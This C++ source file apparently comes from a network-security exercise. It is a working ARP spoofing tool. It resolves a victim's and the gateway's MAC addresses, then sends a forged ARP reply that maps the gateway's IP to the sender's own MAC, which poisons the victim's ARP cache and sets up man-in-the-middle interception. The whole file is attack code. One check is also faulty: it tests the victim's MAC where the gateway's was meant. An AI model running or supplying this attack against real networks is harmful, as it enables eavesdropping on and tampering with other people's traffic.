#include <QCoreApplication>
#include <QDebug>
#include <GApp>
#include <GMac>
#include <GIp>
#include <GPacket>
#include <GPcap>
#include <GRtm>
#include <GNetIntf>

GPcap pcap;

void usage() {
  qDebug() << "usage :" << QCoreApplication::applicationName() << "<sender ip>";
}

GNetIntf* getBestInterface() {
  GRtmEntry* entry = GRtm::instance().getBestEntry("8.8.8.8");
  GNetIntfs& intfs = GNetIntf::all();
  for (GNetIntf& intf: intfs) {
    if (entry != nullptr && entry->intf_ == intf.name_) return &intf;
  }
  return nullptr;
}

GMac getMac(GNetIntf* myIntf, GIp ip) {
  uint8_t buf[sizeof(GEthHdr) + sizeof(GArpHdr)];
  GEthHdr* ethHdr = (GEthHdr*)buf;
  ethHdr->ether_dhost = GMac::broadcastMac();
  ethHdr->ether_shost = myIntf->mac_;
  ethHdr->ether_type = htons(ETHERTYPE_ARP);
  GArpHdr* arpHdr = (GArpHdr*)(buf + sizeof(GEthHdr));
  arpHdr->ar_hrd = htons(ARPHRD_ETHER);
  arpHdr->ar_pro = htons(ETHERTYPE_IP);
  arpHdr->ar_hln = sizeof(GMac);
  arpHdr->ar_pln = sizeof(GIp);
  arpHdr->ar_op = htons(ARPOP_REQUEST);
  arpHdr->ar_sa = myIntf->mac_;
  arpHdr->ar_si = htonl(myIntf->ip_);
  arpHdr->ar_ta = GMac::cleanMac();
  arpHdr->ar_ti = htonl(ip);

  pcap.write(buf, sizeof(buf));

  while (true) {
    GPacket packet;
    packet.clear();
    GCapture::Result res = pcap.read(&packet);
    switch (res) {
      case GCapture::Eof:
      case GCapture::Fail:
        qCritical() << "can not read packet" << pcap.err;
        return GMac::cleanMac();
      case GCapture::TimeOut:
        continue;
      case GCapture::Ok:
        break;
    }
    packet.parse();
    GArpHdr* arpHdr = packet.arpHdr;
    if (arpHdr == nullptr) continue;
    if (ntohs(arpHdr->ar_op) != ARPOP_REPLY) continue;
    if (ntohl(arpHdr->ar_si) == ip) {
      return arpHdr->ar_sa;
    }
  }
  return GMac::cleanMac();
}

int main(int argc, char *argv[])
{
  QCoreApplication a(argc, argv);
  GApp::init();

  GIp myIp, senderIp, targetIp;
  GMac myMac, senderMac, targetMac;

  GNetIntf* intf = getBestInterface();
  if (intf == nullptr) {
    qCritical() << "no best interface";
    exit(-1);
  }
  myIp  = intf->ip_;
  myMac = intf->mac_;
  targetIp = intf->gateway_;

  if (argc != 2) {
    usage();
    exit(-1);
  }
  senderIp = argv[1];

  if (!pcap.active()) {
    pcap.dev_ = intf->name_;
    pcap.autoRead_ = false;
    if (!pcap.open()) {
      qCritical() << pcap.err;
      exit(-1);
    }
  }

  senderMac = getMac(intf, senderIp);
  if (senderMac.isClean()) {
    qCritical() << "can not resolve mac for " << qPrintable(senderIp);
    exit(-1);
  }
  targetMac = getMac(intf, targetIp);
  if (senderMac.isClean()) {
    qCritical() << "can not resolve mac for " << qPrintable(targetIp);
    exit(-1);
  }

  qDebug() << "my     :" << qPrintable(myIp) << qPrintable(myMac);
  qDebug() << "sender :" << qPrintable(senderIp) << qPrintable(senderMac);
  qDebug() << "target :" << qPrintable(targetIp) << qPrintable(targetMac);

  uint8_t buf[sizeof(GEthHdr) + sizeof(GArpHdr)];
  GEthHdr* ethHdr = (GEthHdr*)buf;
  ethHdr->ether_dhost = senderMac;
  ethHdr->ether_shost = myMac;
  ethHdr->ether_type = htons(ETHERTYPE_ARP);
  GArpHdr* arpHdr = (GArpHdr*)(buf + sizeof(GEthHdr));
  arpHdr->ar_hrd = htons(ARPHRD_ETHER);
  arpHdr->ar_pro = htons(ETHERTYPE_IP);
  arpHdr->ar_hln = sizeof(GMac);
  arpHdr->ar_pln = sizeof(GIp);
  arpHdr->ar_op = htons(ARPOP_REPLY);
  arpHdr->ar_sa = myMac;
  arpHdr->ar_si = htonl(targetIp);
  arpHdr->ar_ta = senderMac;
  arpHdr->ar_ti = htonl(senderIp);

  pcap.write(buf, sizeof(buf));
  pcap.close();

  return 0;
}

